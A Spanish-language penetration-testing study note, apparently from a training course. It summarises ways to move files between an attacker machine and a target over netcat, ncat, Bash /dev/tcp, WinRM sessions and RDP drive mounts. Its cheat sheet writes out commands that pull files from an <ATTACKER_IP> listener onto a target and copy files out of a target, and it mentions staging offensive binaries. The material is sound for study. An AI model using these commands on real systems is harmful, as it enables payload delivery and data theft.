---
tags:
  - filetransfer
  - bash
  - netcat
  - WinRM
  - RDP
---
## Conceptos Clave (TL;DR)

* Netcat (nc) y Ncat son utilidades de red para conexiones TCP/UDP que permiten enviar archivos en crudo. La conexión puede iniciarse desde la máquina atacante o el objetivo para eludir reglas de firewall.
* Cuando las utilidades binarias de red no están presentes en Linux, Bash permite conexiones directas a través del pseudo-dispositivo `/dev/tcp`.
* PowerShell Remoting (WinRM) es una excelente alternativa para mover archivos cuando protocolos tradicionales como SMB, HTTP o HTTPS están bloqueados en la red.
* RDP permite el montaje directo de directorios locales hacia la sesión remota actuando como una unidad de red temporal, facilitando transferencias bidireccionales de gran volumen.

  
## Herramientas Clave

* **Netcat (nc)**: Herramienta clásica de red usada para leer o escribir conexiones; capaz de mover archivos redirigiendo los streams de entrada y salida.
* **Ncat**: Reimplementación moderna de Nmap que añade características avanzadas como soporte SSL y proxys.
* **Bash (/dev/tcp)**: Funcionalidad nativa de Bash para interactuar con sockets a nivel de sistema operativo.
* **PowerShell Remoting (PSSession)**: Funcionalidad administrativa de Windows para interactuar remotamente.
* **xfreerdp / rdesktop**: Clientes de protocolo de escritorio remoto en Linux que permiten montar recursos locales.
  

## Metodología Paso a Paso

* **Fase 1: Evaluación de Rutas e Inicio (Netcat/Bash)**: Si se bloquea el tráfico entrante al objetivo, se levanta el listener en la máquina atacante. Si hay bloqueo de salida, el listener se coloca en el objetivo. Se inyecta el contenido del archivo con `<` desde el origen y se guarda con `>` en el destino.

* **Fase 2: Transferencia Segura en Entornos Windows (WinRM)**: Se comprueba conectividad de red a los puertos de administración. Posteriormente, se instancian credenciales en una sesión con `New-PSSession` y se emplea `Copy-Item` encapsulando la transferencia dentro del túnel WinRM.

* **Fase 3: Transferencia RDP**: Al invocar la conexión a través de la interfaz de línea de comandos, se añade el parámetro para inyectar una carpeta de la máquina Linux en el entorno de escritorio remoto. En el target, la carpeta se expone en la ruta UNC genérica del cliente.

## Cheat Sheet de Comandos

### Transferencia con Netcat (Original)
```bash
# Objetivo escuchando: Abre el puerto e indica que la salida se guarde en un archivo.

nc -l -p <PORT> > <FILE>

  
# Atacante enviando: Se conecta al objetivo, inyecta el archivo y cierra (-q 0) al terminar.
nc -q 0 <TARGET_IP> <PORT> < <FILE>


# Atacante escuchando: Abre puerto, inyecta archivo y espera a que el objetivo se conecte para enviarlo.
sudo nc -l -p <PORT> -q 0 < <FILE>

  
# Objetivo recibiendo: Se conecta al atacante y guarda el flujo en el archivo local.
nc <ATTACKER_IP> <PORT> > <FILE>
```
### Transferencia con Ncat
```bash
# Objetivo escuchando: Se configura para recibir datos y cerrar conexión al terminar (--recv-only).

ncat -l -p <PORT> --recv-only > <FILE>

  
# Atacante enviando: Conecta e inyecta archivo cerrando al vaciar la entrada (--send-only).
ncat --send-only <TARGET_IP> <PORT> < <FILE>

  
# Atacante escuchando: Sirve el archivo esperando la conexión entrante.
sudo ncat -l -p <PORT> --send-only < <FILE>

  
# Objetivo recibiendo: Se conecta al atacante y termina al recibir el archivo completo.
ncat <ATTACKER_IP> <PORT> --recv-only > <FILE>
```
### Transferencia vía Bash (/dev/tcp)
```bash
# Objetivo recibiendo archivo sin nc/ncat: Lee desde el socket directo hacia el archivo local.

cat < /dev/tcp/<ATTACKER_IP>/<PORT> > <FILE>
```
### Transferencia vía WinRM / PowerShell Remoting
```powershell
# Comprobar si el puerto WinRM está abierto en el objetivo.
Test-NetConnection -ComputerName <TARGET_HOSTNAME_OR_IP> -Port 5985
  

# Crear sesión WinRM interactiva (usa privilegios de la terminal actual).
$Session = New-PSSession -ComputerName <TARGET_HOSTNAME_OR_IP>
  

# Enviar archivo de local (atacante) a remoto (objetivo) a través de la sesión.
Copy-Item -Path <LOCAL_FILE_PATH> -ToSession $Session -Destination <REMOTE_DIRECTORY_PATH>
  

# Descargar archivo del remoto (objetivo) a la máquina local (atacante).
Copy-Item -Path <REMOTE_FILE_PATH> -Destination <LOCAL_DIRECTORY_PATH> -FromSession $Session
```
### Transferencia mediante Montaje RDP
```bash
# xfreerdp: Conecta montando el directorio local del atacante en el servidor RDP.
xfreerdp /v:<TARGET_IP> /d:<DOMAIN> /u:<USER> /p:'<PASSWORD>' /drive:linux,<LOCAL_LINUX_PATH>

  
# rdesktop: Alternativa para montar directorio local del atacante en el servidor RDP.
rdesktop <TARGET_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' -r disk:linux='<LOCAL_LINUX_PATH>'
```

```powershell
# En la máquina objetivo (desde File Explorer o CMD), acceder al recurso montado.

dir \\tsclient\linux
copy \\tsclient\linux\<FILE> C:\Windows\Temp\
```

## "Gotchas" y Troubleshooting

* **Cierre de Conexiones en Netcat/Ncat**: Por defecto, Ncat mantiene la conexión viva esperando más datos. Debes usar las flags `--send-only` o `--recv-only` dependiendo del extremo para que la conexión termine limpiamente cuando el archivo sea transferido. Con la versión original de Netcat, esto se logra desde el lado del emisor con la flag `-q 0`.

* **Puertos WinRM**: Los listeners por defecto de PowerShell Remoting son TCP/5985 para HTTP y TCP/5986 para HTTPS.

* **Permisos WinRM**: Es indispensable tener acceso con un usuario administrador, o al menos un usuario explícitamente añadido al grupo de "Remote Management Users" en la máquina destino para abrir la `PSSession`.

* **RDP y Windows Defender**: Si compartes una carpeta de Linux que contiene binarios ofensivos y el Windows Defender del objetivo está activo, el antivirus escaneará la unidad `\\tsclient\` expuesta. ¡Esto puede borrar el malware directamente en tu máquina local de ataque!.

* **Aislamiento RDP**: La unidad expuesta con `/drive:` en la conexión RDP es estrictamente privada de esa sesión. No puede ser leída ni manipulada por otros usuarios presentes en el sistema, incluso si un tercero secuestra la conexión.